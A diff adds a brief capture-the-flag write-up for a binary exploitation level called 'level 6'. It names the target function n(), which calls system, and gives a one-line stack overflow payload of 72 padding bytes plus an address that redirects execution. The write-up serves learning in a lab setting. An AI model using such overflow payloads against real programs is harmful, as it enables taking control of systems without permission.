@@ -1,0 +1,9 @@
+level 6
+
+like always we have an executabe level6
+
+containing 3 functions the one we need to focus on is n() it has a call to system
+./level6 $(python -c "print('A' * 72 + '\x54\x84\x04\x08')")
+
+
+source : https://www.youtube.com/watch?v=svgK9fNGTfg
